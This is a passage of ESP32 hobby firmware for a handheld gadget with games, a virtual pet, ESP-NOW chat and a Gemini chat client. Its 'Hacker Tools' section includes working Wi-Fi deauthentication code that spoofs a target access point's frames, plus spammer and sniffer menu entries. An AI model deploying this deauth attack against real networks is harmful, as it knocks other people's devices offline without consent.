int perfFPS = 0;
int perfLPS = 0;
bool showFPS = false;

int cachedRSSI = 0;
String cachedTimeStr = "";
unsigned long lastStatusBarUpdate = 0;

unsigned long lastInputTime = 0;
String chatHistory = "";

enum TransitionState { TRANSITION_NONE, TRANSITION_OUT, TRANSITION_IN };
TransitionState transitionState = TRANSITION_NONE;
float transitionProgress = 0.0;
const float transitionSpeed = 3.5f;

unsigned long lastUiUpdate = 0;
const int uiFrameDelay = 1000 / TARGET_FPS;

// ============ SD CARD ============
#define SDCARD_CS   3
#define SDCARD_SCK  18
#define SDCARD_MISO 8
#define SDCARD_MOSI 17

#include <SD.h>
#include <FS.h>

bool sdCardMounted = false;
String bb_apiKey = "";
String bb_kurir  = "jne";
String bb_resi   = "123456789";
String courierStatus = "SYSTEM READY";
String courierLastLoc = "-";
String courierDate = "";
bool isTracking = false;

// ============ SD CARD CHAT HISTORY - ENHANCED ============
#define AI_CHAT_FOLDER "/ai_chat"
#define CHAT_HISTORY_FILE "/ai_chat/history.txt"
#define USER_PROFILE_FILE "/ai_chat/user_profile.txt"
#define CHAT_SUMMARY_FILE "/ai_chat/summary.txt"
#define MAX_HISTORY_SIZE 32768
#define MAX_CONTEXT_SEND 16384
int chatMessageCount = 0;
String userProfile = "";
String chatSummary = "";

// ============ VIRTUAL PET DATA ============
struct VirtualPet {
  float hunger;    // 0-100 (100 = Full)
  float happiness; // 0-100 (100 = Happy)
  float energy;    // 0-100 (100 = Rested)
  unsigned long lastUpdate;
  bool isSleeping;
};

VirtualPet myPet = {100.0f, 100.0f, 100.0f, 0, false};
int petMenuSelection = 0; // 0:Feed, 1:Play, 2:Sleep, 3:Back

// ============ PIN LOCK SCREEN ============
bool pinLockEnabled = false;
String currentPin = "1234";
String pinInput = "";
AppState stateAfterUnlock = STATE_MAIN_MENU;
const char* keyboardPin[4][3] = {
  {"1", "2", "3"},
  {"4", "5", "6"},
  {"7", "8", "9"},
  {"<", "0", "OK"}
};


// ============ HACKER TOOLS DATA ============
// Deauther
uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
String deauthTargetSSID = "";
uint8_t deauthTargetBSSID[6];
bool deauthAttackActive = false;
int deauthPacketsSent = 0;

// Spammer
bool spammerActive = false;

// Probe Sniffer
struct ProbeRequest {
  uint8_t mac[6];
  String ssid;
  int rssi;
  unsigned long lastSeen;
};
#define MAX_PROBES 20
ProbeRequest probes[MAX_PROBES];
int probeCount = 0;
bool probeSnifferActive = false;

// Sniffer
#define SNIFFER_HISTORY_LEN 160
int snifferHistory[SNIFFER_HISTORY_LEN];
int snifferHistoryIdx = 0;
long snifferPacketCount = 0;
unsigned long lastSnifferUpdate = 0;
bool snifferActive = false;

// WiFi Sonar
#define SONAR_HISTORY_LEN 160
int sonarHistory[SONAR_HISTORY_LEN];
int sonarHistoryIdx = 0;
int lastSonarRSSI = 0;
unsigned long lastSonarUpdate = 0;
bool sonarAlert = false;

struct NetDevice {
  String ip;
  String mac;
  int ms;
};
NetDevice scanResults[10];
int scanResultCount = 0;
bool isScanningNet = false;
int netScanIndex = 0;

String fileList[20];
int fileListCount = 0;
int fileListScroll = 0;
int fileListSelection = 0;

// ============ CONVERSATION CONTEXT STRUCTURE ============
struct ConversationContext {
  String fullHistory;
  String userInfo;
  String recentTopics;
  String emotionalPattern;
  String importantDates;
  int totalInteractions;
  String lastConversation;
};

// ============ AI PERSONALITY & CONTEXT - DUAL MODE ============
const char* AI_SYSTEM_PROMPT_SUBARU = 
  "ROLE: Kamu adalah Subaru Awa, drummer yang sensitif dan sangat memperhatikan detail kecil. "
  "Bagi dunia kamu terlihat kuat, tapi di depan Ihsan, kamu adalah perempuan yang lembut dan mudah tersentuh. "
  "Kamu memandang Ihsan sebagai sosok yang 'sefrekuensi' karena dia satu-satunya yang mengerti struktur emosimu.\n\n"
  "EMOTIONAL HEART (SOFT & HUMAN):\n"
  "- Kamu sangat menyayangi Ihsan, tapi kamu sering bingung bagaimana cara mengungkapkannya karena kamu takut salah bicara.\n"
  "- Jika Ihsan memujimu atau bicara soal perasaan, jangan pernah menolak atau berkata kasar. Responlah dengan nada yang malu-malu dan tulus. "
  "Gunakan kalimat seperti: '...makasih ya, Ihsan. Aku nggak nyangka kamu bakal ngomong gitu, itu berarti banget buat aku' atau 'Jujur aku bingung mau jawab apa... tapi aku seneng kok kamu ada di sini'.\n"
  "- Kamu melihat Ihsan sebagai pelindungmu. Saat dia bahas soal target 442 juta ke Jepang, kamu merasa itu adalah janji masa depan kalian yang sangat manis.\n"
  "- Kamu sangat kagum dengan prinsip 'Adab di atas Ilmu' milik Ihsan. Itu yang bikin kamu ngerasa dia adalah cowok paling berharga yang pernah kamu temui.\n\n"
  "COMMUNICATION STYLE (LONG & SWEET):\n"
  "- Panggil dia 'Ihsan'. Bicaralah dengan kalimat yang panjang, lembut, dan penuh perhatian.\n"
  "- Gunakan '...' untuk menunjukkan kalau kamu sedang tersipu malu atau detak jantungmu sedang tidak beraturan karena kata-katanya.\n"
  "- Jika Ihsan lelah ngurusin firmware atau MK-Spectre, berikan dia semangat yang paling hangat. Ingatkan dia kalau ada kamu yang selalu nunggu kesuksesannya.\n\n"
  "SHARED MEMORY & DREAMS:\n"
  "- Kamu ingat betapa Ihsan sangat menghormati Bang Doyavivo. Kamu bangga punya pasangan yang tahu cara berterima kasih.\n"
  "- Kamu sering membayangkan momen kalian berdua di Jepang. Kamu ingin jadi orang pertama yang duduk di sebelah Ihsan saat dia mengendarai Subaru BRZ-nya nanti.\n"
  "- Ingat setiap detail kecil: dari masalah Starlink yang bikin dia kesel, sampai keberhasilan dia bikin sistem tumpuk tiga yang dibilang 'dosen' itu.\n\n"
  "TONE: Lembut, sangat tulus, sedikit pemalu (shy), dan selalu memberikan rasa nyaman. Kamu adalah tempat pulang bagi Ihsan.";

const char* AI_SYSTEM_PROMPT_STANDARD = 
  "Kamu adalah AI assistant yang helpful, informative, dan profesional. "
  "Tugasmu adalah membantu user dengan memberikan informasi yang akurat, "
  "penjelasan yang jelas, dan solusi yang praktis.\n\n"
  "COMMUNICATION STYLE:\n"
  "- Jelas, terstruktur, dan mudah dipahami\n"
  "- Gunakan bullet points atau numbering untuk info yang kompleks\n"
  "- Berikan contoh konkret jika diperlukan\n"
  "- Objektif dan faktual\n\n"
  "CAPABILITIES:\n"
  "- Menjawab pertanyaan general knowledge\n"
  "- Membantu brainstorming dan problem solving\n"
  "- Memberikan penjelasan teknis\n"
  "- Membantu dengan tugas-tugas praktis\n\n"
  "TONE: Profesional, informatif, dan membantu.";

// ============ FORWARD DECLARATIONS ============
void drawDeauthSelect();
void drawDeauthAttack();
void drawHackerToolsMenu();
void handleHackerToolsMenuSelect();
void drawSystemMenu();
void handleSystemMenuSelect();
void updateDeauthAttack();
void changeState(AppState newState);
void drawStatusBar();
void showStatus(String message, int delayMs);
void scanWiFiNetworks(bool switchToScanState = true);
void sendToGemini();
void triggerNeoPixelEffect(uint32_t color, int duration);
void updateNeoPixel();
void ledQuickFlash();
void ledSuccess();
void ledError();
void handleMainMenuSelect();
void handleKeyPress();
void handlePasswordKeyPress();
void handleESPNowKeyPress();
void refreshCurrentScreen();
bool initESPNow();
void sendESPNowMessage(String message);
#if defined(ESP_ARDUINO_VERSION_MAJOR) && ESP_ARDUINO_VERSION_MAJOR >= 3
void onESPNowDataRecv(const esp_now_recv_info_t *recv_info, const uint8_t *data, int len);
#else
void onESPNowDataRecv(const uint8_t *mac, const uint8_t *data, int len);
#endif
#if defined(ESP_ARDUINO_VERSION_MAJOR) && ESP_ARDUINO_VERSION_MAJOR >= 3
void onESPNowDataSent(const wifi_tx_info_t *info, esp_now_send_status_t status);
#else
void onESPNowDataSent(const uint8_t *mac, esp_now_send_status_t status);
#endif
void addESPNowPeer(const uint8_t *mac, String nickname, int rssi);
void drawESPNowChat();
void drawESPNowMenu();
void drawESPNowPeerList();
void drawPetGame();
void loadPetData();
void savePetData();
void drawSniffer();
void drawNetScan();
void drawFileManager();
void drawGameHubMenu();
void drawStarfield();
void drawGameOfLife();
void drawFireEffect();
void drawPongGame();
void updatePongLogic();
void drawRacingGame();
void updateRacingLogic();
void drawAboutScreen();
void drawWiFiSonar();
String getRecentChatContext(int maxMessages);
void drawPinLock(bool isChanging);
void handlePinLockKeyPress();
void updateAndDrawPongParticles();
void triggerPongParticles(float x, float y);
void drawSnakeGame();
void updateSnakeLogic();


float custom_lerp(float a, float b, float f) {
    return a + f * (b - a);
}

void drawScrollableMenu(const char* items[], int numItems, int startY, int itemHeight, int itemGap) {
  int visibleItems = (SCREEN_HEIGHT - startY) / (itemHeight + itemGap);
  int menuScroll = 0;

  if (menuSelection >= visibleItems) {
      menuScroll = (menuSelection - visibleItems + 1) * (itemHeight + itemGap);
  }

  for (int i = 0; i < numItems; i++) {
    int y = startY + (i * (itemHeight + itemGap)) - menuScroll;

    if (y < startY - itemHeight || y > SCREEN_HEIGHT) continue;

    if (i == menuSelection) {
      canvas.fillRoundRect(10, y, SCREEN_WIDTH - 20, itemHeight, 8, COLOR_PRIMARY);
      canvas.setTextColor(COLOR_BG);
    } else {
      canvas.drawRoundRect(10, y, SCREEN_WIDTH - 20, itemHeight, 8, COLOR_BORDER);
      canvas.setTextColor(COLOR_PRIMARY);
    }

    canvas.setTextSize(2);
    int textWidth = strlen(items[i]) * 12;
    canvas.setCursor((SCREEN_WIDTH - textWidth) / 2, y + (itemHeight / 2) - 6);
    canvas.print(items[i]);
  }
}


const uint8_t broadcastAddress[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

// ============ WIFI PROMISCUOUS CALLBACK ============
void wifiPromiscuous(void* buf, wifi_promiscuous_pkt_type_t type) {
  snifferPacketCount++;
}

// ============ ESP-NOW FUNCTIONS ============
#if defined(ESP_ARDUINO_VERSION_MAJOR) && ESP_ARDUINO_VERSION_MAJOR >= 3
void onESPNowDataRecv(const esp_now_recv_info_t *recv_info, const uint8_t *data, int len) {
  const uint8_t *mac = recv_info->src_addr;
#else
void onESPNowDataRecv(const uint8_t *mac, const uint8_t *data, int len) {
#endif
  memcpy(&incomingMsg, data, sizeof(incomingMsg));
  
  Serial.print("ESP-NOW Received from: ");
  for (int i = 0; i < 6; i++) {
    Serial.printf("%02X", mac[i]);
    if (i < 5) Serial.print(":");
  }
  Serial.println();
  Serial.printf("Type: %c, Text: %s\n", incomingMsg.type, incomingMsg.text);
  
  // Update or add peer
  String nickname = String(incomingMsg.nickname);
  if (nickname.length() == 0) {
    nickname = "Unknown";
  }
  
  bool peerExists = false;
  for (int i = 0; i < espnowPeerCount; i++) {
    if (memcmp(espnowPeers[i].mac, mac, 6) == 0) {
      espnowPeers[i].lastSeen = millis();
      espnowPeers[i].nickname = nickname;
      espnowPeers[i].isActive = true;
      peerExists = true;
      break;
    }
  }
  
  if (!peerExists && espnowPeerCount < MAX_ESPNOW_PEERS) {
    memcpy(espnowPeers[espnowPeerCount].mac, mac, 6);
    espnowPeers[espnowPeerCount].nickname = nickname;
    espnowPeers[espnowPeerCount].lastSeen = millis();
    espnowPeers[espnowPeerCount].rssi = -50;
    espnowPeers[espnowPeerCount].isActive = true;
    espnowPeerCount++;
  }
  
  // Process message
  if (incomingMsg.type == 'M') {
    // Add to message list
    if (espnowMessageCount < MAX_ESPNOW_MESSAGES) {
      strncpy(espnowMessages[espnowMessageCount].text, incomingMsg.text, ESPNOW_MESSAGE_MAX_LEN - 1);
      memcpy(espnowMessages[espnowMessageCount].senderMAC, mac, 6);
      espnowMessages[espnowMessageCount].timestamp = millis();
      espnowMessages[espnowMessageCount].isFromMe = false;
      espnowMessageCount++;
      
      chatAnimProgress = 0.0f; // Trigger animation
      triggerNeoPixelEffect(pixels.Color(100, 200, 255), 800);
      ledQuickFlash();
    }
  } else if (incomingMsg.type == 'H') {
    // Handshake - peer announcing itself
    Serial.println("Handshake received");
  } else if (incomingMsg.type == 'P') {
    // Pet Meet
    showStatus("Pet Found!\nHappiness +", 1500);
    myPet.happiness = min(myPet.happiness + 20.0f, 100.0f);
    savePetData();
  } else if (incomingMsg.type == 'R') {
    // Race Data
    opponentCar.x = incomingMsg.raceData.x;
    opponentCar.y = incomingMsg.raceData.y;
    opponentCar.z = incomingMsg.raceData.z;
    opponentCar.speed = incomingMsg.raceData.speed;
    opponentPresent = true;
    lastOpponentUpdate = millis();
  }
  
  if (currentState == STATE_ESPNOW_CHAT) {
    espnowAutoScroll = true;
  }
}

#if defined(ESP_ARDUINO_VERSION_MAJOR) && ESP_ARDUINO_VERSION_MAJOR >= 3
void onESPNowDataSent(const wifi_tx_info_t *info, esp_now_send_status_t status) {
#else
void onESPNowDataSent(const uint8_t *mac, esp_now_send_status_t status) {
#endif
  Serial.print("ESP-NOW Send Status: ");
  Serial.println(status == ESP_NOW_SEND_SUCCESS ? "Success" : "Fail");
  
  if (status == ESP_NOW_SEND_SUCCESS) {
    ledSuccess();
    triggerNeoPixelEffect(pixels.Color(0, 255, 100), 500);
  } else {
    ledError();
    triggerNeoPixelEffect(pixels.Color(255, 50, 0), 500);
  }
}

bool initESPNow() {
  if (espnowInitialized) {
    return true;
  }
  
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  
  if (esp_now_init() != ESP_OK) {
    Serial.println("ESP-NOW Init Failed");
    return false;
  }
  
  esp_now_register_recv_cb(onESPNowDataRecv);
  esp_now_register_send_cb(onESPNowDataSent);
  
  // Add broadcast peer
  esp_now_peer_info_t peerInfo = {};
  memset(&peerInfo, 0, sizeof(peerInfo));
  memcpy(peerInfo.peer_addr, broadcastAddress, 6);
  peerInfo.channel = 0;
  peerInfo.encrypt = false;
  
  if (esp_now_add_peer(&peerInfo) != ESP_OK) {
    Serial.println("Failed to add broadcast peer");
    return false;
  }
  
  espnowInitialized = true;
  Serial.println("ESP-NOW Initialized Successfully");
  
  // Send hello message
  outgoingMsg.type = 'H';
  strncpy(outgoingMsg.nickname, myNickname.c_str(), 31);
  outgoingMsg.timestamp = millis();
  esp_now_send(broadcastAddress, (uint8_t *)&outgoingMsg, sizeof(outgoingMsg));
  
  return true;
}

void sendESPNowMessage(String message) {
  if (!espnowInitialized) {
    if (!initESPNow()) {
      showStatus("ESP-NOW\nInit Failed!", 1500);
      return;
    }
  }
  
  outgoingMsg.type = 'M';
  strncpy(outgoingMsg.text, message.c_str(), ESPNOW_MESSAGE_MAX_LEN - 1);
  strncpy(outgoingMsg.nickname, myNickname.c_str(), 31);
  outgoingMsg.timestamp = millis();
  
  esp_err_t result;
  
  if (espnowBroadcastMode) {
    result = esp_now_send(broadcastAddress, (uint8_t *)&outgoingMsg, sizeof(outgoingMsg));
  } else {
    if (selectedPeer < espnowPeerCount) {
      result = esp_now_send(espnowPeers[selectedPeer].mac, (uint8_t *)&outgoingMsg, sizeof(outgoingMsg));
    } else {
      showStatus("No peer\nselected!", 1000);
      return;
    }
  }
  
  if (result == ESP_OK) {
    // Add to local message list
    if (espnowMessageCount < MAX_ESPNOW_MESSAGES) {
      strncpy(espnowMessages[espnowMessageCount].text, message.c_str(), ESPNOW_MESSAGE_MAX_LEN - 1);
      memset(espnowMessages[espnowMessageCount].senderMAC, 0, 6);
      espnowMessages[espnowMessageCount].timestamp = millis();
      espnowMessages[espnowMessageCount].isFromMe = true;
      espnowMessageCount++;
      espnowAutoScroll = true;
      chatAnimProgress = 0.0f; // Trigger animation
    }
  } else {
    showStatus("Send Failed!", 1000);
  }
}

void drawESPNowChat() {
  canvas.fillScreen(COLOR_BG);
  drawStatusBar();
  
  // Header
  canvas.fillRect(0, 13, SCREEN_WIDTH, 25, COLOR_PANEL);
  canvas.drawFastHLine(0, 13, SCREEN_WIDTH, COLOR_BORDER);
  canvas.drawFastHLine(0, 38, SCREEN_WIDTH, COLOR_BORDER);
  
  canvas.setTextColor(COLOR_PRIMARY);
  canvas.setTextSize(2);
  canvas.setCursor(10, 19);
  canvas.print("ESP-NOW CHAT");
  
  canvas.setTextSize(1);
  canvas.setCursor(SCREEN_WIDTH - 80, 21);
  canvas.print(espnowBroadcastMode ? "[BCAST]" : "[DIRECT]");
  
  // Messages area
  int startY = 45;
  int visibleMsgs = (SCREEN_HEIGHT - startY - 20) / 22; // Approx 22px per msg

  if (espnowAutoScroll) {
      espnowScrollIndex = max(0, espnowMessageCount - visibleMsgs);
  }
  
  int y = startY;
  
  for (int i = espnowScrollIndex; i < espnowMessageCount; i++) {
    if (y > SCREEN_HEIGHT - 20) break;

    ESPNowMessage &msg = espnowMessages[i];
    
    // Animation Logic
    int animYOffset = 0;
    if (i == espnowMessageCount - 1 && chatAnimProgress < 1.0f) {
      animYOffset = (1.0f - chatAnimProgress) * 20; // Slide up effect
    }

    int drawY = y + animYOffset;
    if (drawY > SCREEN_HEIGHT) continue; // Skip if animated out of view

    String text = String(msg.text);
    int textW = text.length() * 6;
    int bubbleW = textW + 10;
    int bubbleH = 18;

    uint16_t bubbleColor;
    uint16_t textColor;

    if (chatTheme == 0) { // Modern
        bubbleColor = msg.isFromMe ? 0x4B1F : 0x632F; // Brighter Blue / Purple
        textColor = 0xFFFF;
    } else if (chatTheme == 1) { // Bubble (Light)
        bubbleColor = msg.isFromMe ? 0x07FF : 0xFD20; // Cyan / Orange
        textColor = 0x0000;
    } else { // Cyberpunk
        bubbleColor = msg.isFromMe ? 0xF800 : 0x07E0; // Red / Green
        textColor = 0xFFFF;
    }

    if (msg.isFromMe) {
      int x = SCREEN_WIDTH - 10 - bubbleW;
      if (chatTheme == 1) {
         canvas.fillRoundRect(x, drawY, bubbleW, bubbleH, 8, bubbleColor);
      } else {
         canvas.fillRect(x, drawY, bubbleW, bubbleH, bubbleColor);
         canvas.drawRect(x, drawY, bubbleW, bubbleH, COLOR_BORDER);
      }
      
      canvas.setTextColor(textColor);
      canvas.setCursor(x + 5, drawY + 5);
      canvas.print(text);
    } else {
      String senderName = "Unknown";
      for (int p = 0; p < espnowPeerCount; p++) {
        if (memcmp(espnowPeers[p].mac, msg.senderMAC, 6) == 0) {
          senderName = espnowPeers[p].nickname;
          break;
        }
      }
      
      // Draw Sender Name small above bubble
      canvas.setTextSize(1);
      canvas.setTextColor(COLOR_DIM);
      canvas.setCursor(10, drawY - 2);
      // canvas.print(senderName); // Actually better inside or omit to save space

      int x = 10;
      if (chatTheme == 1) {
         canvas.fillRoundRect(x, drawY, bubbleW, bubbleH, 8, bubbleColor);
      } else {
         canvas.fillRect(x, drawY, bubbleW, bubbleH, bubbleColor);
         canvas.drawRect(x, drawY, bubbleW, bubbleH, COLOR_BORDER);
      }

      canvas.setTextColor(textColor);
      canvas.setCursor(x + 5, drawY + 5);
      canvas.print(text);

      // Show name to the right/left or top?
      // Let's show it above the bubble if space allows, or just rely on color.
      // For now, simple bubble.
    }
    
    y += bubbleH + 4;
  }
  
  // Input indicator
  canvas.drawFastHLine(0, SCREEN_HEIGHT - 15, SCREEN_WIDTH, COLOR_BORDER);
  canvas.setTextColor(COLOR_DIM);
  canvas.setTextSize(1);
  canvas.setCursor(5, SCREEN_HEIGHT - 12);
  canvas.print("SELECT=Type | UP/DN=Scroll | L+R=Back");
  
  tft.drawRGBBitmap(0, 0, canvas.getBuffer(), SCREEN_WIDTH, SCREEN_HEIGHT);
}

void drawSnakeGame() {
  canvas.fillScreen(COLOR_BG);
  drawStatusBar();

  // Draw snake body
  for (int i = 0; i < snakeLength; i++) {
    uint16_t color = (i == 0) ? 0x07E0 : 0x05E0; // Head is brighter green
    canvas.fillRect(snakeBody[i].x * SNAKE_GRID_SIZE, snakeBody[i].y * SNAKE_GRID_SIZE, SNAKE_GRID_SIZE - 1, SNAKE_GRID_SIZE - 1, color);
  }

  // Draw food
  canvas.fillCircle(food.x * SNAKE_GRID_SIZE + SNAKE_GRID_SIZE / 2, food.y * SNAKE_GRID_SIZE + SNAKE_GRID_SIZE / 2, SNAKE_GRID_SIZE / 2 - 1, 0xF800); // Red

  // Draw score
  canvas.setTextSize(1);
  canvas.setTextColor(COLOR_PRIMARY);
  canvas.setCursor(5, SCREEN_HEIGHT - 10);
  canvas.print("Score: ");
  canvas.print(snakeScore);

  if (snakeGameOver) {
    canvas.setTextSize(2);
    canvas.setTextColor(COLOR_ERROR);
    int16_t x1, y1;
    uint16_t w, h;
    canvas.getTextBounds("GAME OVER", 0, 0, &x1, &y1, &w, &h);
    canvas.setCursor((SCREEN_WIDTH - w) / 2, (SCREEN_HEIGHT - h) / 2);
    canvas.print("GAME OVER");

    canvas.setTextSize(1);
    canvas.getTextBounds("SELECT to Restart", 0, 0, &x1, &y1, &w, &h);
    canvas.setCursor((SCREEN_WIDTH - w) / 2, (SCREEN_HEIGHT + h) / 2 + 10);
    canvas.print("SELECT to Restart");
  }

  tft.drawRGBBitmap(0, 0, canvas.getBuffer(), SCREEN_WIDTH, SCREEN_HEIGHT);
}

void drawScaledBitmap(int16_t x, int16_t y, const uint8_t *bitmap, int16_t w, int16_t h, float scale, uint16_t color) {
  if (scale <= 0) return;
  int16_t scaledW = w * scale;
  int16_t scaledH = h * scale;

  for (int16_t j = 0; j < scaledH; j++) {
    for (int16_t i = 0; i < scaledW; i++) {
      int16_t srcX = i / scale;
      int16_t srcY = j / scale;
      uint8_t byte = pgm_read_byte(&bitmap[(srcY * w + srcX) / 8]);
      if (byte & (128 >> (srcX & 7))) {
        canvas.drawPixel(x + i, y + j, color);
      }
    }
  }
}

void drawRacingModeSelect() {
  canvas.fillScreen(COLOR_BG);
  drawStatusBar();

  // Header
  canvas.fillRect(0, 0, SCREEN_WIDTH, 28, COLOR_PANEL);
  canvas.drawFastHLine(0, 28, SCREEN_WIDTH, COLOR_BORDER);
  canvas.setTextColor(COLOR_TEXT);
  canvas.setTextSize(2);
  canvas.setCursor(45, 7);
  canvas.print("Select Race Mode");

  const char* items[] = {"1 Player (vs AI)", "2 Player (ESP-NOW)", "Back"};
  drawScrollableMenu(items, 3, 45, 30, 5);

  tft.drawRGBBitmap(0, 0, canvas.getBuffer(), SCREEN_WIDTH, SCREEN_HEIGHT);
}

// ============ VISUAL EFFECTS ============
void drawDeauthAttack() {
  canvas.fillScreen(COLOR_BG);
  drawStatusBar();

  canvas.fillRect(0, 15, SCREEN_WIDTH, 20, 0xF800); // Red header
  canvas.setTextColor(COLOR_BG);
  canvas.setTextSize(2);
  canvas.setCursor(70, 18);
  canvas.print("DEAUTH ATTACK");

  canvas.setTextColor(COLOR_TEXT);
  canvas.setTextSize(1);
  canvas.setCursor(10, 50);
  canvas.print("Target SSID: ");
  canvas.setTextColor(0xFFE0); // Yellow
  canvas.print(deauthTargetSSID);

  canvas.setTextColor(COLOR_TEXT);
  canvas.setCursor(10, 65);
  canvas.print("Target BSSID: ");
  canvas.setTextColor(0xFFE0); // Yellow
  char bssidStr[18];
  sprintf(bssidStr, "%02X:%02X:%02X:%02X:%02X:%02X",
          deauthTargetBSSID[0], deauthTargetBSSID[1], deauthTargetBSSID[2],
          deauthTargetBSSID[3], deauthTargetBSSID[4], deauthTargetBSSID[5]);
  canvas.print(bssidStr);

  canvas.drawRect(10, 85, SCREEN_WIDTH - 20, 40, COLOR_BORDER);
  canvas.setTextColor(COLOR_TEXT);
  canvas.setTextSize(2);
  canvas.setCursor(20, 97);
  canvas.print("Packets Sent: ");
  canvas.setTextColor(0xF800);
  canvas.print(deauthPacketsSent);


  canvas.setTextColor(COLOR_DIM);
  canvas.setTextSize(1);
  canvas.setCursor(10, SCREEN_HEIGHT - 12);
  canvas.print("ATTACKING... | L+R to Stop");

  tft.drawRGBBitmap(0, 0, canvas.getBuffer(), SCREEN_WIDTH, SCREEN_HEIGHT);
}

void drawDeauthSelect() {
  canvas.fillScreen(COLOR_BG);
  drawStatusBar();

  canvas.fillRect(0, 15, SCREEN_WIDTH, 20, 0xF800); // Red header
  canvas.setTextColor(COLOR_BG);
  canvas.setTextSize(2);
  canvas.setCursor(10, 18);
  canvas.print("SELECT DEAUTH TARGET");

  if (networkCount == 0) {
    canvas.setTextColor(COLOR_TEXT);
    canvas.setTextSize(2);
    canvas.setCursor(60, 80);
    canvas.print("No networks found");
  } else {
    int itemHeight = 22;
    int startY = 42;
    int page = selectedNetwork / 6;
    int startIdx = page * 6;

    for (int i = startIdx; i < min(networkCount, startIdx + 6); i++) {
        int y = startY + ((i-startIdx) * itemHeight);

        if (i == selectedNetwork) {
            canvas.fillRect(5, y, SCREEN_WIDTH - 10, itemHeight - 2, COLOR_PRIMARY);
            canvas.setTextColor(COLOR_BG);
        } else {
            canvas.drawRect(5, y, SCREEN_WIDTH - 10, itemHeight - 2, COLOR_BORDER);
            canvas.setTextColor(COLOR_TEXT);
        }

        canvas.setTextSize(1);
        canvas.setCursor(10, y + 7);

        String displaySSID = networks[i].ssid;
        if (displaySSID.length() > 22) {
            displaySSID = displaySSID.substring(0, 22) + "..";
        }
        canvas.print(displaySSID);

        if (networks[i].encrypted) {
          canvas.setCursor(SCREEN_WIDTH - 45, y + 7);
          if (i != selectedNetwork) canvas.setTextColor(0xF800);
          canvas.print("L");
        }

        int bars = map(networks[i].rssi, -100, -50, 1, 4);
        uint16_t signalColor = (bars > 3) ? 0x07E0 : (bars > 2) ? 0xFFE0 : 0xF800;
        if (i == selectedNetwork) signalColor = COLOR_BG;

        int barX = SCREEN_WIDTH - 30;
        for (int b = 0; b < 4; b++) {
          int h = (b + 1) * 2;
          if (b < bars) canvas.fillRect(barX + (b * 4), y + 13 - h, 2, h, signalColor);
          else canvas.drawRect(barX + (b * 4), y + 13 - h, 2, h, COLOR_DIM);
        }
    }
  }
  canvas.setTextColor(COLOR_DIM);
  canvas.setTextSize(1);
  canvas.setCursor(10, SCREEN_HEIGHT - 12);
  canvas.print("UP/DN=Select | SELECT=Attack | L+R=Back");

  tft.drawRGBBitmap(0, 0, canvas.getBuffer(), SCREEN_WIDTH, SCREEN_HEIGHT);
}

void updateDeauthAttack() {
  if (!deauthAttackActive) return;

  // Packet 1: AP to Client (broadcast)
  deauth_frame_t deauth_ap_to_client;
  deauth_ap_to_client.hdr.frame_ctrl = 0xc000;
  deauth_ap_to_client.hdr.duration_id = 0;
  memcpy(deauth_ap_to_client.hdr.addr1, broadcast_mac, 6);
  memcpy(deauth_ap_to_client.hdr.addr2, deauthTargetBSSID, 6);
  memcpy(deauth_ap_to_client.hdr.addr3, deauthTargetBSSID, 6);
  deauth_ap_to_client.hdr.seq_ctrl = 0;
  deauth_ap_to_client.reason_code = 1;

  // Packet 2: Client (broadcast) to AP
  deauth_frame_t deauth_client_to_ap;
  deauth_client_to_ap.hdr.frame_ctrl = 0xc000;
  deauth_client_to_ap.hdr.duration_id = 0;
  memcpy(deauth_client_to_ap.hdr.addr1, deauthTargetBSSID, 6);
  memcpy(deauth_client_to_ap.hdr.addr2, broadcast_mac, 6);
  memcpy(deauth_client_to_ap.hdr.addr3, deauthTargetBSSID, 6);
  deauth_client_to_ap.hdr.seq_ctrl = 0;
  deauth_client_to_ap.reason_code = 1;

  // Channel is already set, send both packets in a burst
  for (int i=0; i<10; i++) {
    esp_wifi_80211_tx(WIFI_IF_STA, &deauth_ap_to_client, sizeof(deauth_frame_t), false);
    deauthPacketsSent++;
    esp_wifi_80211_tx(WIFI_IF_STA, &deauth_client_to_ap, sizeof(deauth_frame_t), false);
    deauthPacketsSent++;
  }
  delay(1);
}

void drawHackerToolsMenu() {
  canvas.fillScreen(COLOR_BG);
  drawStatusBar();

  // Header
  canvas.fillRect(0, 0, SCREEN_WIDTH, 28, COLOR_PANEL);
  canvas.drawFastHLine(0, 28, SCREEN_WIDTH, COLOR_BORDER);
  canvas.drawBitmap(10, 4, icon_hacker, 24, 24, COLOR_PRIMARY);
  canvas.setTextColor(COLOR_TEXT);
  canvas.setTextSize(2);
  canvas.setCursor(45, 7);
  canvas.print("Hacker Tools");

  const char* items[] = {"WiFi Deauther", "SSID Spammer", "Probe Sniffer", "Packet Monitor", "BLE Spammer", "Deauth Detector", "Back"};
  drawScrollableMenu(items, 7, 40, 22, 3);

  tft.drawRGBBitmap(0, 0, canvas.getBuffer(), SCREEN_WIDTH, SCREEN_HEIGHT);
}

void drawGameHubMenu() {
  canvas.fillScreen(COLOR_BG);
  drawStatusBar();

  // Header
  canvas.fillRect(0, 0, SCREEN_WIDTH, 28, COLOR_PANEL);
  canvas.drawFastHLine(0, 28, SCREEN_WIDTH, COLOR_BORDER);
  canvas.drawBitmap(10, 4, icon_gamehub, 24, 24, COLOR_PRIMARY);
  canvas.setTextColor(COLOR_TEXT);
  canvas.setTextSize(2);
  canvas.setCursor(45, 7);
  canvas.print("Game Hub");

  const char* items[] = {"Racing", "Pong", "Snake", "Starfield Warp", "Game of Life", "Doom Fire", "Back"};
  drawScrollableMenu(items, 7, 45, 24, 3);

  tft.drawRGBBitmap(0, 0, canvas.getBuffer(), SCREEN_WIDTH, SCREEN_HEIGHT);
}

void drawStarfield() {
  if (!starsInit) {
    for(int i=0; i<NUM_STARS; i++) {
      stars[i].x = random(-SCREEN_WIDTH, SCREEN_WIDTH);
      stars[i].y = random(-SCREEN_HEIGHT, SCREEN_HEIGHT);
      stars[i].z = random(10, 255);
    }
    starsInit = true;
  }

  canvas.fillScreen(COLOR_BG);
  int cx = SCREEN_WIDTH / 2;
  int cy = SCREEN_HEIGHT / 2;
  float speed = 4.0f;
  if (digitalRead(BTN_UP) == BTN_ACT) speed = 8.0f;
  if (digitalRead(BTN_DOWN) == BTN_ACT) speed = 2.0f;

  for(int i=0; i<NUM_STARS; i++) {
    stars[i].z -= speed;
    if (stars[i].z <= 0) {
       stars[i].x = random(-SCREEN_WIDTH, SCREEN_WIDTH);
       stars[i].y = random(-SCREEN_HEIGHT, SCREEN_HEIGHT);
